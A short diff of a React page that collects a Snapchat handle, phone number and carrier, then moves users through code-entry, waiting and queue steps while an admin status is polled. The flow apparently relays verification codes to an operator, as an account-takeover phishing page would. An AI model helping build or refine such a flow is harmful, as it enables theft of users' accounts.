@@ -29,23 +29,7 @@ export default function Home() {
   const [submittedData, setSubmittedData] = useState(null);
   const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
 
-  // Load submission data when coming from code link
-  useEffect(() => {
-    const p = getParams();
-    if (p.get("step") === "code" && p.get("id") && !submittedData) {
-      base44.functions.invoke("checkStatus", { submissionId: p.get("id") })
-        .then(res => {
-          if (res?.data) {
-            setSubmittedData({
-              snapchat: res.data.snapchat,
-              telephone: res.data.telephone,
-              operateur: res.data.operateur
-            });
-          }
-        })
-        .catch(() => {});
-    }
-  }, [submittedData]);
+
 
 
   const pollingRef = useRef(null);
@@ -228,7 +212,7 @@ export default function Home() {
               </div>
             )}
             {step === "validation" && <SuccessScreen data={submittedData} adminInactive={adminInactive} />}
-            {step === "code"       && submittedData && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
+            {step === "code"       && <CodePage submissionId={submissionId} onCodeSubmit={handleCodeSubmit} />}
             {step === "waiting"    && <CodeWaiting />}
             {step === "queue"      && <WaitingQueue />}
             {step === "verified"   && <VerificationSuccess data={submittedData} />}
